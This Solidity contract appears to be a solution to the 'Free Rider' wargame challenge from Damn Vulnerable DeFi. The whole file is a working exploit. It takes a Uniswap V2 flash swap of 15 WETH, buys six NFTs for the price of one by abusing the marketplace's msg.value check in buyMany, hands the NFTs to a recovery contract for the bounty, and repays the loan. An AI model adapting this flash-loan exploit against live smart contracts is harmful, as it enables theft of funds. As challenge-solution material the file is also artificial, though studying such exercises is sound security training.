// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "solmate/src/tokens/WETH.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

contract FreeRiderAttacker is ReentrancyGuard, IERC721Receiver {

    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recovery;
    IUniswapV2Pair pair;
    address player;

    constructor(address payable addr1, address addr2, address addr3) payable {
        marketplace = FreeRiderNFTMarketplace(addr1);
        recovery = FreeRiderRecovery(addr2);
        pair = IUniswapV2Pair(addr3);
        player = msg.sender;
    }

    function attack() public payable {
        // We loan 15 ether amount of WETH from uniswapv2, then perform the attack in callback function `uniswapV2Call`.
        pair.swap(15 ether, 0, address(this), "0x11");
    }

    // EIP721 requires NFT receive contracts to implement this function for safety.
    function onERC721Received(address, address, uint256, bytes memory) external override nonReentrant returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        // Withdraw all WETH to ETH. We should have over 15 ETH to buy from NFTMarketPlace.
        WETH weth = WETH(payable(pair.token0()));
        weth.withdraw(amount0);
        // Buy NFTs.
        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; ++i) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);
        // Send NFTs to recovery contract to claim bounty.
        DamnValuableNFT token = marketplace.token();
        bytes memory payload = abi.encode(player);
        for (uint i = 0; i < 6; ++i) {
            token.safeTransferFrom(address(this), address(recovery), i, payload);
        }
        // Return back the loan.
        uint256 fee = amount0 * 3 / 997 + 1;
        uint256 repayAmount = fee + amount0;
        weth.deposit{value: repayAmount}();
        assert(weth.transfer(msg.sender, repayAmount));
    }

    // Do not forget this, as receive function is required for receiving eth.
    receive() external payable {}
}
